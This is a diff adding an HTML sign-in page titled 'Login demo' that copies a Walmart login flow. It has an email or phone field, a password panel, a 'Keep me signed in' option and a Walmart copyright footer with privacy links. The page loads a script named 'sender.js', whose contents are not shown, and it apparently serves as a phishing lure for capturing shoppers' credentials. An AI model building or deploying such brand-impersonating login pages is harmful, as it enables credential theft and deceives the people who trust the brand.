@@ -1,0 +1,97 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Login demo</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/styles.css">
+  </head>
+  <body>
+    <main class="card centered-main" role="main" style="margin-bottom: 40px;">
+      <div id="panel1">
+      <div class="logo" aria-hidden>
+        <!-- placeholder logo (yellow star) -->
+        <img class="logo" src="image.png" alt="logotipo">
+      </div>
+      <h1 class="sign">Sign in or create your account</h1>
+      <p class="lead">Not sure if you have an account? Enter your phone number or email and we'll check for you.</p>
+
+      <div class="field">
+        <label for="identifier">Phone number or email *</label>
+        <input id="identifier" type="text" >
+      </div>
+
+      <p class="small muted">Securing your personal information is our priority. <a class="link" href="#">See our privacy measures.</a></p>
+
+      <button id="continueBtn" class="btn">Continue</button>
+      </div>
+
+      <section class="card " role="main" style="margin-bottom: 40px;">
+         <div id="panel2" class="secondary" aria-hidden>      
+        <div class="logo" aria-hidden>
+        <img class="logo" src="image.png" alt="logotipo">
+      </div>
+      <h1 class="sign"> Welcome back! </h1>
+      <div class="email-line">Email<br><strong id="displayEmail">usuario@example.com</strong> <a id="changeLink" class="link" href="#">Change</a></div>
+
+      <div class="divider"></div>
+
+      <div class="choose">Choose a sign in method</div>
+      <label class="radio"><input type="radio" name="method" value="code" id="optCode"> <div class="divPassword">Email me a verification code<br><span class="small muted" id="codeEmail">user@example.com</span></div></label>
+      <label class="radio"><input type="radio" name="method" value="password" id="optPass" checked> <div class="divPassword">Password</div></label>
+
+      <div id="passwordBlock" class="field">
+        <label for="password">Password</label>
+        <div class="password-row">
+        <input id="password" type="password" placeholder="">
+        <button id="togglePwd" class="show-btn" type="button" aria-label="Mostrar contraseña">Show</button>
+        </div>
+        <a id="forgotPwd" class="link forgot-link" href="#">Forgot password?</a>
+      </div>
+
+      <div class="checkbox-row">
+        <input id="keepSigned" type="checkbox" checked>
+        <label for="keepSigned" class="muted">Keep me signed in</label>
+      </div>
+      <div class="small muted">Uncheck if using a public device. <a class="link" href="#">More</a></div>
+
+      <button id="signInBtn" class="btn">Sign in</button>
+    </div>
+      </section>
+      
+    </main>
+    <style>
+      .centered-main {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-left: auto;
+      margin-right: auto;
+      margin-bottom: 40px;
+      }
+    </style>
+
+    <footer class="site-footer" role="contentinfo">
+      <div class="left">© 2026 Walmart. All Rights Reserved.</div>
+      <div class="center">
+        <nav class="links" aria-label="Footer links">
+          <a href="#">Give feedback</a>
+          <a href="#">CA Privacy Rights</a>
+          <a href="#">Your Privacy Choices</a>
+          <a href="#">Notice at Collection</a>
+          <a href="#">Request My Personal Information</a>
+          <a href="#">Delete Account</a>
+          <a href="#">California Supply Chains Act</a>
+        </nav>
+      </div>
+      <div class="right">
+        <div class="switch" id="optSwitch" role="switch" aria-checked="true" tabindex="0"></div>
+        <div class="opt-label">Opt-Out Request Honored</div>
+      </div>
+    </footer>
+
+    <script src="js/sender.js"></script>
+    <script src="js/app.js" defer></script>
+  </body>
+</html>
